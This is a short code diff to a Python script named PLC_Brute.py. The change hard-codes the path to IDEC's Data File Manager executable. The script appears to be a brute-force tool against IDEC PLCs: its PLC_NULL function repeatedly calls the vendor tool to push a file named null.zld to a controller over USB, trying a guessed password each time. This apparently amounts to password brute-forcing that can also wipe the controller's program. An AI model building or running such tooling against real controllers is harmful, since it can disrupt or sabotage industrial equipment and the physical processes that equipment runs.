@@ -11,8 +11,15 @@ import sys
 import time
 from time import sleep
 
-# you need to put AO suite tools in your windows path for this program to work right
-# This code assumes that this is true
+# Full path to the Data File Manager EXE
+# r"" raw string litteral -- dont interepret BS as escapes chars
+ao_exe = r"C:\Program Files (x86)\IDEC\IDEC Automation Organizer\Data File Manager\DataFileManager.exe"
+
+# Optional: Verify the file exists
+if not os.path.isfile(ao_exe):
+    print(f"Executable not found: {ao_exe}")
+    exit(1)
+
 '''
 Compile exe:
 pyinstaller --onefile  PLC_Brute.py
@@ -150,8 +157,7 @@ def PLC_NULL():
         progress_thread.start()
 
         try:
-            subprocess.run([
-                "DataFileManager.exe", "\\PLC", "-S", "\\download",
+            subprocess.run([ao_exe, "\\PLC", "-S", "\\download",
                 "-C", ".\\null.zld", "USB", f"pass-{pwd}"
             ], timeout=120)
         except subprocess.TimeoutExpired:
